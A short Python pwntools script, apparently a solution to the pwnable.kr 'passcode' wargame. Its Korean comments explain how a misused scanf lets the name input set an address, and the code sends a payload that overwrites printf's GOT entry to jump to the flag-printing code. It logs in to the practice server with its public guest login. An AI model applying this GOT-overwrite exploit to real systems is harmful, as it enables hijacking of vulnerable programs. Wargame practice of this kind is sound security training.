#! -*- coding:utf-8 -*-

from pwn import * 

s = ssh(user='passcode',host='pwnable.kr',port=2222,password='guest')
p = s.process("./passcode")

#p = process("./passcode")
#ssh passcode@pwnable.kr -p2222 
#시작시 입력도 받고 이것저것 하는데, login 함수에서 입력을 포인터가 아닌
#변수 값에다가 받기 때문에 원하는 대로 입력이 안들어갈거다. 
#두번쨰 입력 시, 스택의 주소가 아닌 주소에 위치한 값에 입력을 받게 되어있다.
# 즉 스택에서 ebp-0x10 위치에 주소를 입력하면 
# 해당 주소 위치를 덮어 쓸 수 있게 된다. 아이디 입력 시 마지막 4바이트.
# 즉, 원하는 주소위치를 원하는 값으로 덮을 수 있다는 이야기. 
# 함수의 got를 flag 를 출력하는 코드 주소 위치로 덮어서 점프시켜보자. 
# 이때, 코드 주소를 넣을때 %d로 입력을 받으니까 정수형으로 넣어줘야 한다.

printf_got = 0x804a000
cat_flag = 0x080485e3

payload = "a"*96
payload += p32(printf_got)

pause()
p.sendline(payload)

payload2 = str(cat_flag)
sleep(0.5)

p.sendline(payload2)

p.interactive()

#Sorry mom.. I got confused about scanf usage :(